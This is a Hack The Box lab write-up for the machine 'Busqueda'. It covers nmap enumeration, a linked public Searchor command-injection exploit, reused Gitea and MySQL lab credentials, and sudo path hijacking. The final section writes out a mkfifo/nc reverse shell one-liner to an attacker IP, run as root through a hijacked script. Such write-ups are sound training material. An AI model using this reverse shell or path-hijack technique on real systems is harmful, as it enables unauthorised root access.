---
title: "Busqueda"
date: 2024-04-17
categories: HTB
tags: ["ctf", "penetration testing", "htb", "cybersecurity", "htb writeup", "busqueda", "htb walkthrough", "hackthebox", "writeup"]
---

# Busqueda

# Busqueda

## Summary
# Credentials
| Username      | Password            | Hash | Source |
| ------------- | ------------------- | ---- | ------ |
| svc           | jh1usoih2bkjaspwe92 |      |        |
| gitea         | jI86kGUuj87guWr3RyF |      |        |
| administrator | yuiu1hoiu4i5ho1uh   |      |        |
|               |                     |      |        |
# Notes
"Env":
MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF
MYSQL_USER=gitea
MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh
MYSQL_DATABASE=gitea
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
"GOSU_VERSION=1.14"
"MYSQL_MAJOR=8.0"
"MYSQL_VERSION=8.0.31-1.el8"
"MYSQL_SHELL_VERSION=8.0.31-1.el8"]
# Enumeration
- Footer contains service version number.
# Initial Access
- Gain shell as `svc` user by using a public exploit.
# Privilege Escalation
- `/var/www` contains `.git`
	- `config` file contains cody user credentials for `gitea.searcher.htb`
		- add the new domain to `/etc/hosts`
		- sign in with the obtained credentials 
- SSH as `svc` user with cody user's passsword.
	- `sudo -l` svc user has sudo privileges to run some python scripts
	- Following the official documentation for command formats, I was able to obtain more credentials.
	- Path abuse one of the python scripts. 
		- create a new file with reverse shell payload in another directory `/tmp`.
		- name it the same 
		- execute the file in the `tmp` using `sudo`.

# Nmap
# TCP
```sh
└─$ nmap -sC -sV 10.10.11.208 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-05 10:31 AEST
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 42.98% done; ETC: 10:31 (0:00:08 remaining)
Nmap scan report for 10.10.11.208
Host is up (0.019s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# 80-HTTP
# Screenshots
![screenshot](/assets/images/busqueda1.png)

![screenshot](/assets/images/busqueda2.png)

![screenshot](/assets/images/busqueda3.png)


# Initial Access
https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection

Shell as svc
![screenshot](/assets/images/busqueda4.png)

![screenshot](/assets/images/busqueda5.png)

```text
http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
```

![screenshot](/assets/images/busqueda6.png)

```text
0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator@gitea.searcher.htb
```

add gitea.searcher.htb to `/etc/hosts`

![screenshot](/assets/images/busqueda7.png)

sign in as `cody : jh1usoih2bkjaspwe92`

![screenshot](/assets/images/busqueda8.png)

ssh as `svc :jh1usoih2bkjaspwe92 `

# Privilege Escalation

![screenshot](/assets/images/busqueda10.png)


![screenshot](/assets/images/busqueda11.png)

![screenshot](/assets/images/busqueda12.png)

https://docs.docker.com/reference/cli/docker/inspect/

![screenshot](/assets/images/busqueda13.png)

```sh
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' mysql_db
```


![screenshot](/assets/images/busqueda14.png)

![screenshot](/assets/images/busqueda15.png)

We now attempt to leverage the relative reference to `full-checkup.sh` by executing the `system-checkup` script from another directory that will contain our own malicious `full-checkup.sh` script.

```sh
# create a shell file and insert a reverse shell payload into it
echo -en "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 9001 >/tmp/f" > /tmp/full-checkup.sh
# make it executable
chmod +x /tmp/full-checkup.sh
# execute the shell
cd /tmp
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

![screenshot](/assets/images/busqueda16.png)
